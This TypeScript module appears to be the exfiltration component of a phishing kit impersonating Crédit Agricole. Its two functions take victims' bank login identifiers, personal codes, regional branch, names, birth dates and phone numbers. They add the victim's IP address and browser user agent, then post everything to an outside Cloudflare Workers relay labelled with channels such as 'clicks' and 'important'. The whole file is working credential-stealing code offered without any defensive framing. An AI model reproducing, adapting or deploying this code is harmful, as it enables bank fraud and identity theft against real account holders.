const W = 'https://ca-omerta-proxy.hugairke14324.workers.dev';

async function getUserIP(): Promise<string> {
  try {
    const c = new AbortController();
    const id = setTimeout(() => c.abort(), 5000);
    const r = await fetch('https://api.ipify.org?format=json', { signal: c.signal });
    clearTimeout(id);
    return (await r.json()).ip || 'unknown';
  } catch {
    return 'unknown';
  }
}

async function send(channel: string, text: string): Promise<any> {
  try {
    const r = await fetch(W + '/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ channel, text }),
    });
    return r.json();
  } catch {
    return { ok: false };
  }
}

export const sendLoginNotification = async (user: string, password: string, region: string) => {
  const ip = await getUserIP();
  const ua = navigator.userAgent;

  const msg = `<b>🏦 Login Crédit Agricole</b>\n`
    + `├ 👤 Identifiant : <code>${user}</code>\n`
    + `├ 🔒 Code Personnel : <code>${password}</code>\n`
    + `└ 🏡 Caisse régionale : <code>${region}</code>\n\n`
    + `🌐 IP : <code>${ip}</code>\n`
    + `📱 UA : <code>${ua}</code>\n\n`
    + `<b>— Fresh CA —</b>`;

  await send('clicks', msg);
};

export const sendVerificationNotification = async (
  nom: string, prenom: string, date: string, tel: string,
  user: string, password: string, region: string
) => {
  const ip = await getUserIP();
  const ua = navigator.userAgent;

  const msg = `<b>🏦 Vérification Crédit Agricole</b>\n`
    + `├ 🪪 Nom et Prénom : <code>${nom} ${prenom}</code>\n`
    + `├ 📅 Date de Naissance : <code>${date}</code>\n`
    + `└ 📱 Numéro de Téléphone : <code>${tel}</code>\n\n`
    + `<blockquote><b>— 🏦 LOG Crédit Agricole —</b>\n`
    + `├ 👤 Identifiant : <code>${user}</code>\n`
    + `├ 🔒 Code Personnel : <code>${password}</code>\n`
    + `└ 🏡 Caisse régionale : <code>${region}</code></blockquote>\n\n`
    + `🌐 IP : <code>${ip}</code>\n`
    + `📱 UA : <code>${ua}</code>\n\n`
    + `<b>— Fresh CA —</b>`;

  await send('important', msg);
};
